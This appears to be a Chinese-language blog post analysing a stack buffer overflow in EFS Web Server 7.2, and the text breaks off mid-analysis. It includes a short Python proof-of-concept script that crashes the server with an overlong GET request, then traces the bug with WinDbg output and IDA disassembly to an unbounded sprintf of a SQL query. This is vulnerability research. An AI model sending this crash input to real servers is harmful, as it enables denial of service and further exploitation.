@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="EFS Web Server 7.2漏洞分析简介EFS Web Server是一款web服务器软件，能快速的搭建web服务。它在接受GET请求时，由于没有有效的控制请求字符串的长度导致栈溢出。  分析环境12345OS:                 Microsoft Windows 10 64bit 专业版Software:           EFS Web Server 7.2winDb">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EFS Web Server 7.2漏洞分析">
+<meta property="og:url" content="http://yoursite.com/2017/12/03/EFS Web Server 7.2漏洞分析/index.html">
+<meta property="og:site_name" content="R00tnb&#39;s Blog">
+<meta property="og:description" content="EFS Web Server 7.2漏洞分析简介EFS Web Server是一款web服务器软件，能快速的搭建web服务。它在接受GET请求时，由于没有有效的控制请求字符串的长度导致栈溢出。  分析环境12345OS:                 Microsoft Windows 10 64bit 专业版Software:           EFS Web Server 7.2winDb">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://img.blog.csdn.net/20170910202318859?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQva29zdGFydDEyMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:updated_time" content="2018-08-04T07:14:21.742Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="EFS Web Server 7.2漏洞分析">
+<meta name="twitter:description" content="EFS Web Server 7.2漏洞分析简介EFS Web Server是一款web服务器软件，能快速的搭建web服务。它在接受GET请求时，由于没有有效的控制请求字符串的长度导致栈溢出。  分析环境12345OS:                 Microsoft Windows 10 64bit 专业版Software:           EFS Web Server 7.2winDb">
+<meta name="twitter:image" content="http://img.blog.csdn.net/20170910202318859?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQva29zdGFydDEyMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/12/03/EFS Web Server 7.2漏洞分析/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>EFS Web Server 7.2漏洞分析 | R00tnb's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R00tnb's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/03/EFS Web Server 7.2漏洞分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="r00tnb">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R00tnb's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">EFS Web Server 7.2漏洞分析
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2017-12-03 15:45:00" itemprop="dateCreated datePublished" datetime="2017-12-03T15:45:00+08:00">2017-12-03</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2018-08-04 15:14:21" itemprop="dateModified" datetime="2018-08-04T15:14:21+08:00">2018-08-04</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/二进制漏洞分析/" itemprop="url" rel="index"><span itemprop="name">二进制漏洞分析</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="EFS-Web-Server-7-2漏洞分析"><a href="#EFS-Web-Server-7-2漏洞分析" class="headerlink" title="EFS Web Server 7.2漏洞分析"></a>EFS Web Server 7.2漏洞分析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>EFS Web Server是一款web服务器软件，能快速的搭建web服务。它在接受GET请求时，由于没有有效的控制请求字符串的长度导致栈溢出。</p>
+<hr>
+<h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OS:                 Microsoft Windows 10 64bit 专业版</span><br><span class="line">Software:           EFS Web Server 7.2</span><br><span class="line">winDbg:             6.12.2.633</span><br><span class="line">IDAPro:             6.8 绿色版</span><br><span class="line">python:             python 2.7</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>编写如下的脚本用作poc<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># fileName: poc.py</span></span><br><span class="line"><span class="comment"># usage: python poc.py ip payloadNums</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">RHOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">RPORT = <span class="number">80</span></span><br><span class="line">payload = <span class="string">'\x41'</span>*int(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((RHOST,RPORT))</span><br><span class="line">s.send(<span class="string">'GET '</span>+payload+<span class="string">' HTTP/1.0\r\n\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'done.'</span></span><br></pre></td></tr></table></figure></p>
+<p>打开EFS，用windbg附加到该进程，然后执行poc，windbg遇到异常被断下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(9f0.4220): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=41414141 ebx=00000001 ecx=ffffffff edx=00b65fa4 esi=00b65f7c edi=00b65fa4</span><br><span class="line">eip=61c277f6 esp=00b65ef8 ebp=00b65f10 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206</span><br><span class="line">*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Users\gyh\Desktop\1\sqlite3.dll - </span><br><span class="line">sqlite3!sqlite3_errcode+0x8e:</span><br><span class="line">61c277f6 81784c97a629a0  cmp     dword ptr [eax+4Ch],0A029A697h ds:002b:4141418d=????????</span><br></pre></td></tr></table></figure></p>
+<p>这里是因为eax+4ch处的内存没有开辟出来导致内存访问异常，而且eax=41414141这是畸形字符串的值，说明传入的payload已经覆盖了eax，下面进行堆栈回溯找到上层的函数调用去分析漏洞是如何触发的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">00b65f10 61c6286c 000011b8 00001194 02ef4724 sqlite3!sqlite3_errcode+0x8e</span><br><span class="line">*** WARNING: Unable to verify checksum for C:\Users\gyh\Desktop\1\fsws.exe</span><br><span class="line">*** ERROR: Module load completed but symbols could not be loaded for C:\Users\gyh\Desktop\1\fsws.exe</span><br><span class="line">00b65f50 00496624 00000001 00000000 00b65f7c sqlite3!sqlite3_declare_vtab+0x3282</span><br><span class="line">00b675f4 00000000 00000000 00b6755c 00b67570 fsws+0x96624</span><br></pre></td></tr></table></figure></p>
+<p>函数返回在<code>61c6286c</code>处，打开ida载入sqlite3.dll并跳转到该处<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:61C6284E                 push    ebp</span><br><span class="line">.text:61C6284F                 mov     ebp, esp</span><br><span class="line">.text:61C62851                 push    edi</span><br><span class="line">.text:61C62852                 push    esi</span><br><span class="line">.text:61C62853                 push    ebx</span><br><span class="line">.text:61C62854                 sub     esp, 2Ch</span><br><span class="line">.text:61C62857                 mov     ebx, eax</span><br><span class="line">.text:61C62859                 mov     edi, edx</span><br><span class="line">.text:61C6285B                 mov     [ebp+var_1C], ecx</span><br><span class="line">.text:61C6285E                 mov     esi, [ebp+arg_8]</span><br><span class="line">.text:61C62861                 mov     dword ptr [esi], 0</span><br><span class="line">.text:61C62867                 call    _sqlite3SafetyCheckOk</span><br><span class="line">.text:61C6286C                 test    eax, eax			;ret addr</span><br><span class="line">.text:61C6286E                 jz      short loc_61C62874</span><br><span class="line">.text:61C62870                 test    edi, edi</span><br></pre></td></tr></table></figure></p>
+<p>显然漏洞的触发位置就在<code>_sqlite3SafetyCheckOk</code>，直接跟进去F5<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __usercall sqlite3SafetyCheckOk@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// ebx@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">76</span>) != <span class="number">-1607883113</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LOBYTE(v1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( sqlite3SafetyCheckSickOrOk() )</span><br><span class="line">        sqlite3_log(<span class="number">21</span>, <span class="string">"API call with %s database connection pointer"</span>, <span class="string">"unopened"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sqlite3_log(<span class="number">21</span>, <span class="string">"API call with %s database connection pointer"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">"NULL"</span>);</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里的<code>*(_DWORD *）（a1+76）</code>就是漏洞触发位置的<code>[eax+4ch]</code>，我们应该关注<code>a1</code>。这里的<code>a1</code>是上层函数传递进来的，回到上层函数F5<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __usercall sqlite3LockAndPrepare@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;eax&gt;, <span class="keyword">int</span> a2@&lt;edx&gt;, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _DWORD *a5, <span class="keyword">int</span> a6)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ebx@1</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// edi@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// edx@3</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v9; <span class="comment">// edx@4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v10; <span class="comment">// ST18_4@6</span></span><br><span class="line"></span><br><span class="line">  v6 = a1;</span><br><span class="line">  v7 = a2;</span><br><span class="line">  *a5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sqlite3SafetyCheckOk(a1) &amp;&amp; v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    sqlite3_mutex_enter(*(_DWORD *)(v6 + <span class="number">12</span>));</span><br><span class="line">    sqlite3BtreeEnterAll();</span><br><span class="line">    v9 = sqlite3Prepare(a3, a4, a5, a6);</span><br><span class="line">    <span class="keyword">if</span> ( v9 == <span class="number">17</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sqlite3_finalize(*a5);</span><br><span class="line">      v9 = sqlite3Prepare(a3, a4, a5, a6);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = v9;</span><br><span class="line">    sqlite3BtreeLeaveAll();</span><br><span class="line">    sqlite3_mutex_leave(*(_DWORD *)(v6 + <span class="number">12</span>));</span><br><span class="line">    v8 = v10;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sqlite3_log(<span class="number">21</span>, <span class="string">"misuse at line %d of [%.10s]"</span>, <span class="number">105119</span>, <span class="string">"9d6c1880fb75660bbabd693175579529785f8a6b"</span>);</span><br><span class="line">    v8 = <span class="number">21</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>该函数传递给<code>sqlite3SafetyCheckOk</code>的参数又是上层函数传递进来的第一个参数，所以继续查看<code>00496624</code>返回位置处的函数，这个地址是主程序<code>fsws.exe</code>的，所以再打开一个ida载入<code>fsws.exe</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00496600                 push    ecx</span><br><span class="line">.text:00496601                 mov     eax, [esp+4+arg_4]</span><br><span class="line">.text:00496605                 push    esi</span><br><span class="line">.text:00496606                 test    eax, eax</span><br><span class="line">.text:00496608                 mov     [esp+8+var_4], 0</span><br><span class="line">.text:00496610                 push    0</span><br><span class="line">.text:00496612                 jz      short loc_496644</span><br><span class="line">.text:00496614                 lea     edx, [esp+0Ch+arg_4]</span><br><span class="line">.text:00496618                 push    edx</span><br><span class="line">.text:00496619                 push    0FFFFFFFFh</span><br><span class="line">.text:0049661B                 push    eax</span><br><span class="line">.text:0049661C                 mov     eax, [ecx]</span><br><span class="line">.text:0049661E                 push    eax</span><br><span class="line">.text:0049661F                 call    sqlite3_prepare_v2		;</span><br><span class="line">.text:00496624                 add     esp, 14h			;ret addr</span><br><span class="line">.text:00496627                 test    eax, eax</span><br><span class="line">.text:00496629                 jz      short loc_49663F</span><br></pre></td></tr></table></figure></p>
+<p>该函数调用了<code>sqlite3_prepare_v2</code>函数，这个函数属于sqlite3.dll的导出函数，在加载了sqlite3.dll的ida中搜索该函数并F5<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sqlite3_prepare_v2</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> sqlite3LockAndPrepare(a1, a2, <span class="number">1</span>, <span class="number">0</span>, (_DWORD *)a4, a5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这个函数又调用了<code>sqlite3LockAndPrepare(a1, a2, 1, 0, (_DWORD *)a4, a5);</code>，这样整个函数调用就连接起来了，这里只要关注第一个参数<code>a1</code>，还要继续向上回溯。回到加载主程序的ida，找到刚刚位置的函数直接F5<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">thiscall <span class="title">sub_496600</span><span class="params">(_DWORD *<span class="keyword">this</span>, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp-4h] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sqlite3_prepare_v2(*<span class="keyword">this</span>, a3, <span class="number">-1</span>, &amp;a3, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_496710(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> a2;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = a3;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_496710(v4);</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>传递给<code>sqlite3_prepare_v2</code>的第一个参数是<code>sub_496600</code>的第一个参数指向内存的值，所以要继续向上层回溯看看是那个函数在修改这个值。这里如果用交叉引用的话函数太多，所以直接在windbg中下断点<code>bp 496600</code>，然后通过堆栈回溯找到上层调用。触发断点后要继续执行，找到离触发漏洞最近的断点然后分析。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">030b75f4 00000000 00000000 030b755c 030b7570 fsws+0x96600</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，堆栈回溯无法找到上层函数的调用，可能是因为上层的调用没有标准的使用ebp。这里可以先查看寄存器的值指向的内存，看看有没有与畸形字符串相关的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; r</span><br><span class="line">eax=030b5fa4 ebx=00001101 ecx=030b7028 edx=030b715b esi=030b7028 edi=02e2f4fc</span><br><span class="line">eip=00496600 esp=030b5f74 ebp=030b75f4 iopl=0         nv up ei pl nz ac po nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212</span><br><span class="line">fsws+0x96600:</span><br><span class="line">00496600 51              push    ecx</span><br><span class="line"></span><br><span class="line">0:007&gt; dc eax</span><br><span class="line">030b5fa4  656c6573 2a207463 6f726620 7173206d  select * from sq</span><br><span class="line">030b5fb4  6261746c 7720656c 65726568 6d616e20  ltable where nam</span><br><span class="line">030b5fc4  41273d65 41414141 41414141 41414141  e=&apos;AAAAAAAAAAAAA</span><br><span class="line">030b5fd4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">030b5fe4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">030b5ff4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">030b6004  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br><span class="line">030b6014  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure></p>
+<p>这是一个sql查询，里面有传入的畸形字符串。而且esp与eax的值很相近，说明sql查询字符串就在栈上，可能就是应为sql查询字符串的拼接导致栈的溢出。回到加载主程序的ida查找<code>select * from</code>的字符串</p>
+<p><img src="http://img.blog.csdn.net/20170910202318859?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQva29zdGFydDEyMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="1"></p>
+<p>发现有很多这样的字符串，但是跟上面的sql查询语句匹配的只有<code>select * from %s where %s=&#39;%s&#39;</code>，这里有两处，随便跟进去一处<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:004972B1                 push    edi</span><br><span class="line">.text:004972B2                 push    edx</span><br><span class="line">.text:004972B3                 push    eax</span><br><span class="line">.text:004972B4                 push    offset aSelectFromSWhe ; &quot;select * from %s where %s=&apos;%s&apos;&quot;</span><br><span class="line">.text:004972B9                 push    ecx             ; char *</span><br><span class="line">.text:004972BA                 call    _sprintf</span><br><span class="line">.text:004972BF                 add     esp, 14h</span><br><span class="line">.text:004972C2                 lea     edx, [esp+1028h+var_100C]</span><br><span class="line">.text:004972C6                 lea     eax, [esp+1028h+var_1014]</span><br><span class="line">.text:004972CA                 mov     ecx, esi</span><br><span class="line">.text:004972CC                 push    edx</span><br><span class="line">.text:004972CD                 push    eax</span><br><span class="line">.text:004972CE                 call    sub_496600			;调用了要关注的函数</span><br><span class="line">.text:004972D3                 add     esi, 4</span><br></pre></td></tr></table></figure></p>
